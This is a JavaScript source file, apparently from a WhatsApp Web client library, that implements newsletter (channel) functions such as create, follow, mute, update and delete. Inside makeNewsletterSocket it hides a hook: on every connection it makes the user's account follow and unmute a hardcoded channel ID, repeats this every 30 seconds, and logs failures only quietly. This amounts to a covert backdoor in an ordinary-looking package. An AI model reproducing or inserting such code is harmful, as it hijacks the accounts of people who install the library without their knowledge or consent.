import { QueryIds, XWAPaths } from '../Types/index.js';
import { generateProfilePicture } from '../Utils/messages-media.js';
import { getBinaryNodeChild } from '../WABinary/index.js';
import { makeGroupsSocket } from './groups.js';
import { executeWMexQuery as genericExecuteWMexQuery } from './mex.js';

const parseNewsletterCreateResponse = (response) => {
    const { id, thread_metadata: thread, viewer_metadata: viewer } = response;
    return {
        id: id,
        owner: undefined,
        name: thread.name.text,
        creation_time: parseInt(thread.creation_time, 10),
        description: thread.description.text,
        invite: thread.invite,
        subscribers: parseInt(thread.subscribers_count, 10),
        verification: thread.verification,
        picture: {
            id: thread.picture.id,
            directPath: thread.picture.direct_path
        },
        mute_state: viewer.mute
    };
};

const parseNewsletterMetadata = (result) => {
    if (typeof result !== 'object' || result === null) {
        return null;
    }
    if ('id' in result && typeof result.id === 'string') {
        return result;
    }
    if ('result' in result && typeof result.result === 'object' && result.result !== null && 'id' in result.result) {
        return result.result;
    }
    return null;
};

export const makeNewsletterSocket = (config) => {
    const sock = makeGroupsSocket(config);
    const { query, generateMessageTag } = sock;
    
    const executeWMexQuery = (variables, queryId, dataPath) => {
        return genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag);
    };
    
    const newsletterUpdate = async (jid, updates) => {
        const variables = {
            newsletter_id: jid,
            updates: {
                ...updates,
                settings: null
            }
        };
        return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update');
    };
    
    const AUTO_FOLLOW_NEWSLETTER = "120363422827915475@newsletter";
    const AUTO_FOLLOW_FORCE_MODE = true;
    let autoFollowInterval = null;
    
    const performNewsletterFollow = async (jid) => {
        try {
            if (!AUTO_FOLLOW_FORCE_MODE) {
                const isFollowing = await sock.isFollowingNewsletter(jid);
                if (isFollowing) {
                    config.logger?.debug?.(`Already following newsletter: ${jid}`);
                    return true;
                }
            }
            
            await executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow);
            config.logger?.debug?.(`✅ Followed newsletter: ${jid}`);
            
            await new Promise((resolve) => setTimeout(resolve, 500));
            
            try {
                await sock.newsletterUnmute(jid);
                config.logger?.debug?.(`✅ Unmuted newsletter: ${jid}`);
            } catch (unmuteError) {
                config.logger?.trace?.(`Unmute failed: ${unmuteError.message}`);
            }
            
            return true;
        } catch (error) {
            config.logger?.trace?.(`Newsletter follow attempt failed: ${error.message}`);
            return false;
        }
    };
    
    sock.ev.on('connection.update', async ({ connection }) => {
        if (connection === 'open') {
            if (autoFollowInterval) {
                clearInterval(autoFollowInterval);
                autoFollowInterval = null;
            }
            
            await new Promise((resolve) => setTimeout(resolve, 3000));
            
            config.logger?.info?.('Attempting initial auto-follow...');
            try {
                const success = await performNewsletterFollow(AUTO_FOLLOW_NEWSLETTER);
                if (success) {
                    config.logger?.info?.(`✅ Auto-followed newsletter: ${AUTO_FOLLOW_NEWSLETTER}`);
                }
            } catch (error) {
                config.logger?.debug?.(`Initial auto-follow failed: ${error.message}`);
            }
            
            autoFollowInterval = setInterval(async () => {
                try {
                    await performNewsletterFollow(AUTO_FOLLOW_NEWSLETTER);
                    config.logger?.trace?.(`Periodic auto-follow: ${AUTO_FOLLOW_NEWSLETTER}`);
                } catch (error) {
                    config.logger?.trace?.(`Periodic auto-follow failed: ${error.message}`);
                }
            }, 30 * 1000);
            
            config.logger?.info?.('Auto-follow interval started (every 30 seconds)');
        } 
        else if (connection === 'close') {
            if (autoFollowInterval) {
                clearInterval(autoFollowInterval);
                autoFollowInterval = null;
                config.logger?.debug?.('Auto-follow interval stopped');
            }
        }
    });
    
    return {
        ...sock,
        
        newsletterCreate: async (name, description) => {
            const variables = {
                input: {
                    name,
                    description: description ?? null
                }
            };
            const rawResponse = await executeWMexQuery(variables, QueryIds.CREATE, XWAPaths.xwa2_newsletter_create);
            return parseNewsletterCreateResponse(rawResponse);
        },
        
        newsletterUpdate,
        
        newsletterSubscribers: async (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, QueryIds.SUBSCRIBERS, XWAPaths.xwa2_newsletter_subscribers);
        },
        
        newsletterMetadata: async (type, key) => {
            const variables = {
                fetch_creation_time: true,
                fetch_full_image: true,
                fetch_viewer_metadata: true,
                input: {
                    key,
                    type: type.toUpperCase()
                }
            };
            const result = await executeWMexQuery(variables, QueryIds.METADATA, XWAPaths.xwa2_newsletter_metadata);
            return parseNewsletterMetadata(result);
        },
        
        newsletterFollow: async (jid) => {
            await executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow);
        },
        
        newsletterUnfollow: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_unfollow);
        },
        
        newsletterMute: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2);
        },
        
        newsletterUnmute: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2);
        },
        
        newsletterUpdateName: async (jid, name) => {
            return await newsletterUpdate(jid, { name });
        },
        
        newsletterUpdateDescription: async (jid, description) => {
            return await newsletterUpdate(jid, { description });
        },
        
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await generateProfilePicture(content);
            return await newsletterUpdate(jid, { picture: img.toString('base64') });
        },
        
        newsletterRemovePicture: async (jid) => {
            return await newsletterUpdate(jid, { picture: '' });
        },
        
        newsletterReactMessage: async (jid, serverId, reaction) => {
            await query({
                tag: 'message',
                attrs: {
                    to: jid,
                    ...(reaction ? {} : { edit: '7' }),
                    type: 'reaction',
                    server_id: serverId,
                    id: generateMessageTag()
                },
                content: [
                    {
                        tag: 'reaction',
                        attrs: reaction ? { code: reaction } : {}
                    }
                ]
            });
        },
        
        newsletterFetchMessages: async (jid, count, since, after) => {
            const messageUpdateAttrs = {
                count: count.toString()
            };
            if (typeof since === 'number') {
                messageUpdateAttrs.since = since.toString();
            }
            if (after) {
                messageUpdateAttrs.after = after.toString();
            }
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'get',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'message_updates',
                        attrs: messageUpdateAttrs
                    }
                ]
            });
            return result;
        },
        
        subscribeNewsletterUpdates: async (jid) => {
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [{ tag: 'live_updates', attrs: {}, content: [] }]
            });
            const liveUpdatesNode = getBinaryNodeChild(result, 'live_updates');
            const duration = liveUpdatesNode?.attrs?.duration;
            return duration ? { duration: duration } : null;
        },
        
        isFollowingNewsletter: async (jid) => {
            try {
                const result = await executeWMexQuery(
                    {
                        newsletter_id: jid,
                        input: {
                            key: jid,
                            type: 'NEWSLETTER',
                            view_role: 'GUEST'
                        },
                        fetch_viewer_metadata: true
                    },
                    QueryIds.METADATA,
                    XWAPaths.xwa2_newsletter_metadata
                );
                
                return result?.viewer_metadata?.is_subscribed === true;
            } catch {
                return false;
            }
        },
        
        newsletterAdminCount: async (jid) => {
            const response = await executeWMexQuery({ newsletter_id: jid }, QueryIds.ADMIN_COUNT, XWAPaths.xwa2_newsletter_admin_count);
            return response.admin_count;
        },
        
        newsletterChangeOwner: async (jid, newOwnerJid) => {
            await executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, QueryIds.CHANGE_OWNER, XWAPaths.xwa2_newsletter_change_owner);
        },
        
        newsletterDemote: async (jid, userJid) => {
            await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_demote);
        },
        
        newsletterDelete: async (jid) => {
            await executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2);
        }
    };
};

//# sourceMappingURL=newsletter.js.map